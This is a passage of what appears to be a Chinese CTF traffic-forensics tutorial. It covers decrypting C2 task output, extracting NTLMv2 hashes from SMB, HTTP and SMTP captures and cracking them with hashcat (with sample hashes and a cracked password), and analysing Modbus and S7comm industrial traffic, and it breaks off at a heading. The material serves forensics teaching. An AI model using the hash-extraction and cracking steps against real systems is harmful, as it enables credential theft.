</span></span><span class=line><span class=cl>        <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data1</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;=&#39;</span><span class=o>*</span><span class=mi>80</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>dec</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;gbk&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>dec</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>例题1-2024西湖论剑初赛-cscs</p><h2 class=heading-element id=ntlmv2流量分析><span>NTLMv2流量分析</span>
<a href=#ntlmv2%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>NTLMv2流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包</p><p>可以在Wireshark中用关键字 ntlmssp 过滤，然后在成功认证的流量包的分组详情中提取我们需要的字段</p><p>当然也可以用这个<a href=https://github.com/mlgualtieri/NTLMRawUnHide/blob/master/NTLMRawUnHide.py target=_blank rel="external nofollow noopener noreferrer">开源项目</a>中的脚本自动识别并提取</p><p><img loading=lazy src=/posts/5422d65/imgs/%E5%9B%BE%E7%89%87.webp alt=/posts/5422d65/imgs/%E5%9B%BE%E7%89%87.webp height=2136 width=3280></p><h3 class=heading-element id=提取-ntlmv2-哈希值并破解smb协议><span>提取 NTLMv2 哈希值并破解（SMB协议）</span>
<a href=#%e6%8f%90%e5%8f%96-ntlmv2-%e5%93%88%e5%b8%8c%e5%80%bc%e5%b9%b6%e7%a0%b4%e8%a7%a3smb%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>1.过滤出ntlmssp的请求包，查看 Session Set Request 并复制NTLMSSP_AUTH包中Security Blob层的User name、Domain name</p><p>2.查看NTLMSSP_AUTH包中的NTLM响应，并复制出ntlmv2_response以及ntproofstr3</p><p>3.过滤出ntlmssp的请求包，查看Session Set Response 并复制出NTLM Server Challenge的值，通常这个数据包是在NTLM_Auth数据包之前</p><p>4.把以上内容按照固定格式组合并保存到hash.txt中</p><p><strong>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</strong></p><p>这里要注意ntlmv2response的开头就是NTproofstring，因此分开来组合</p><p>5.使用hashcat爆破hash值</p><p>.\hashcat -a 0 -m 5600 hash.txt .\rockyou.txt</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>administrator::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000</span></span></code></pre></td></tr></table></div></div><p>最后使用 hashcat 进行爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hashcat -m 5600 hash.txt rockyou.txt</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ hashcat -m <span class=m>5600</span> hash.txt rockyou.txt --show
</span></span><span class=line><span class=cl>ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=提取-ntlmv2-哈希值并破解http协议><span>提取 NTLMv2 哈希值并破解（HTTP协议）</span>
<a href=#%e6%8f%90%e5%8f%96-ntlmv2-%e5%93%88%e5%b8%8c%e5%80%bc%e5%b9%b6%e7%a0%b4%e8%a7%a3http%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>大致步骤和SMB协议的差不多，就是NTLM信息放在了 hypertext transport protocol 中
按照之前的步骤提取出来，然后 hashcat 爆破即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=提取-ntlmv2-哈希值并破解smtp协议><span>提取 NTLMv2 哈希值并破解（SMTP协议）</span>
<a href=#%e6%8f%90%e5%8f%96-ntlmv2-%e5%93%88%e5%b8%8c%e5%80%bc%e5%b9%b6%e7%a0%b4%e8%a7%a3smtp%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>这里的NTLM流量信息可能base64编码过了，所以分析前需要base64解码：</p><p><img loading=lazy src=/posts/5422d65/imgs/N6.png alt=/posts/5422d65/imgs/N6.png height=1600 width=2560></p><p>后续步骤就和之前一样了，提取信息然后用 hashcat 爆破</p><p><strong>NTLMv2 中 NTproofstring 生成过程如下：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user_name</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;QUICAUTH-CCC123!@#&#34;</span>
</span></span><span class=line><span class=cl><span class=n>domain_name</span> <span class=o>=</span> <span class=s2>&#34;SecretServer&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用MD4消息摘要算法得到16字节的 NTLM_HASH</span>
</span></span><span class=line><span class=cl><span class=n>ntlm_hash</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;md4&#34;</span><span class=p>,</span> <span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;NTLM Hash: </span><span class=si>{</span><span class=n>ntlm_hash</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user_domain_name</span> <span class=o>=</span> <span class=n>user_name</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>)</span><span class=o>+</span><span class=n>domain_name</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;User Domain Data: </span><span class=si>{</span><span class=n>user_domain_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用 NTLM_HASH 作为密钥对用户名域名进行MD5加密</span>
</span></span><span class=line><span class=cl><span class=n>firstHMAC</span> <span class=o>=</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ntlm_hash</span><span class=p>),</span> <span class=n>user_domain_name</span><span class=p>,</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;First HMAC Result: </span><span class=si>{</span><span class=n>firstHMAC</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ntlm_authentication_data</span> <span class=o>=</span> <span class=s2>&#34;d158262017948de9010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NTproofstring</span> <span class=o>=</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>firstHMAC</span><span class=p>),</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ntlm_authentication_data</span><span class=p>),</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>NTproofstring</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># NTLM Hash: 61a26d3fee855453bc125700bc8cf6f2</span>
</span></span><span class=line><span class=cl><span class=c1># User Domain Data: b&#39;A\x00D\x00M\x00I\x00N\x00S\x00E\x00C\x00R\x00E\x00T\x00S\x00E\x00R\x00V\x00E\x00R\x00&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># First HMAC Result: 7d3ce509093fb2b7bcbbe7939fa8ee74</span>
</span></span><span class=line><span class=cl><span class=c1># efa243f442b9d683eb1b00a2b1a0c9fc</span></span></span></code></pre></td></tr></table></div></div><p>例题1-2024数据安全产业人才积分争夺赛 Strangesystem</p><h2 class=heading-element id=工控流量分析><span>工控流量分析</span>
<a href=#%e5%b7%a5%e6%8e%a7%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>参考连接：https://blog.csdn.net/song123sh/article/details/128387982</p><p>将流量按长度降序排列，然后在各层寻找线索，</p><p>显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型</p><h3 class=heading-element id=modbus-协议分析><span>Modbus 协议分析</span>
<a href=#modbus-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP</p><p><strong>Modbus/RTU</strong></p><blockquote><p>从机地址1B+功能码1B+数据字段xB+CRC值2B
最大长度256B，所以数据字段最大长度252B</p></blockquote><p><strong>Modbus/ASCII</strong></p><blockquote><p>由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍
开始标记:（0x3A）1B+从机地址2B+功能码2B+数据字段xB+LRC值2B+结束标记\r\n2B
最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B</p></blockquote><p><strong>Modbus/TCP</strong></p><blockquote><p>不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验
传输标识符2B+协议标识符2B+长度2B+从机ID 1B+功能码1B+数据字段xB</p></blockquote><p>一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）
因此解题的时候配合过滤器一个个功能码看过去就行</p><blockquote><p>1：读线圈
2：读离散输入
3：读保持
4：读输入
5：写单个线圈
6：写单个保持
15：写多个线圈
16：写多个保持</p></blockquote><h4 class=heading-element id=例题1-hngk-modbus流量分析><span>例题1 HNGK-Modbus流量分析</span>
<a href=#%e4%be%8b%e9%a2%981-hngk-modbus%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>使用下面这个过滤器命令即可得到 flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(((_ws.col.protocol == &#34;Modbus/TCP&#34;) ) &amp;&amp; (modbus.byte_cnt)) &amp;&amp; (modbus.func_code == 16)</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430142133329.png alt=/posts/5422d65/imgs/image-20240430142133329.png height=2160 width=3842>
flag{TheModbusProtocolIsFunny!}</p><h3 class=heading-element id=s7comm-协议分析><span>S7comm 协议分析</span>
<a href=#s7comm-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议
主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7)
Job：下发任务/指令
Ack_Data：带有返回数据
Ack：单纯确认，含有数据
Userdata：用户自定义数据区，也包含功能指令</p></blockquote><h4 class=heading-element id=例题1-2020icsc湖州站工控协议数据分析><span>例题1 2020ICSC湖州站—工控协议数据分析</span>
<a href=#%e4%be%8b%e9%a2%981-2020icsc%e6%b9%96%e5%b7%9e%e7%ab%99%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e6%95%b0%e6%8d%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据
<img loading=lazy src=/posts/5422d65/imgs/image-20240430111822297.png alt=/posts/5422d65/imgs/image-20240430111822297.png height=2160 width=3842>
因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据
<img loading=lazy src=/posts/5422d65/imgs/image-20240430112312109.png alt=/posts/5422d65/imgs/image-20240430112312109.png height=2160 width=3842>
然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>((</span>s7comm<span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=o>(</span>s7comm.resp.data<span class=o>))</span> <span class=o>&amp;&amp;</span> <span class=o>(</span>s7comm.param.func <span class=o>==</span> 0x05<span class=o>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430112740044.png alt=/posts/5422d65/imgs/image-20240430112740044.png height=2154 width=3838></p><p>然后使用 tshark 提取数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430112936680.png alt=/posts/5422d65/imgs/image-20240430112936680.png height=675 width=1731></p><p>最后 CyberChef 解码二进制即可得到 flag
<img loading=lazy src=/posts/5422d65/imgs/image-20240430113016466.png alt=/posts/5422d65/imgs/image-20240430113016466.png height=1197 width=2296></p><h4 class=heading-element id=例题2-2020icsc济南站被篡改的数据><span>例题2 2020ICSC济南站—被篡改的数据</span>
